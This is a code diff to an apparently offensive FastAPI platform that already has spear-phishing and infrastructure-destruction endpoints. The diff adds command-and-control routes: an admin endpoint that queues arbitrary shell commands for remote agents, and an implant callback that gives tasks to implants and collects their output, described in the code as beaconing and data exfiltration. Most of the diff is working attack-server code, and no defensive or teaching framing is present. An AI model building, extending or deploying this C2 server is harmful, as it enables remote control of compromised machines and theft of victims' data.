@@ -14,7 +14,7 @@ from fastapi import FastAPI, HTTPException, Depends, Security, status, Backgroun
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.middleware.gzip import GZipMiddleware
-from fastapi.responses import JSONResponse
+from fastapi.responses import JSONResponse, Response
 from pydantic import BaseModel, Field, validator
 
 class SpearPhishingRequest(BaseModel):
@@ -876,6 +876,56 @@ async def destroy_infrastructure(
         message="Infrastructure destruction successful.",
         data={"destroy_output": destroy_output}
     )
+
+
+# C2 Endpoints
+class C2Task(BaseModel):
+    agent_id: str
+    command: str
+
+@app.post("/c2/task/queue", response_model=APIResponse)
+async def queue_c2_task(
+    task: C2Task,
+    current_user: dict = Depends(get_current_user)
+):
+    """Queues a command for an agent to execute."""
+    if current_user["role"] != "admin":
+        raise HTTPException(status_code=403, detail="Admin access required")
+
+    task_id = f"task_{secrets.token_urlsafe(8)}"
+    task_data = {"id": task_id, "command": task.command}
+    
+    # Push the task to the agent's queue in Redis
+    await app.state.auth_manager.redis.lpush(f"c2:tasks:{task.agent_id}", json.dumps(task_data))
+    
+    return APIResponse(
+        message="Task queued for agent.",
+        data={"agent_id": task.agent_id, "task_id": task_id}
+    )
+
+@app.api_route("/c2/implant/callback", methods=["GET", "POST"])
+async def handle_c2_callback(request: Request):
+    """Handles beaconing and data exfiltration from implants."""
+    agent_id = request.headers.get("X-Agent-ID", "unknown_agent")
+
+    if request.method == "POST":
+        # Agent is sending back results
+        result_data = await request.json()
+        task_id = result_data.get("task_id")
+        output = result_data.get("output")
+        
+        # Store the result in Redis
+        await app.state.auth_manager.redis.set(f"c2:result:{task_id}", output, ex=3600) # Result expires in 1 hour
+        return Response(status_code=200)
+
+    elif request.method == "GET":
+        # Agent is asking for a task
+        task_json = await app.state.auth_manager.redis.rpop(f"c2:tasks:{agent_id}")
+        if task_json:
+            return JSONResponse(content=json.loads(task_json))
+        else:
+            # No task, send back an empty command
+            return JSONResponse(content={"id": "", "command": ""})
 
 
 @app.get("/system/status")
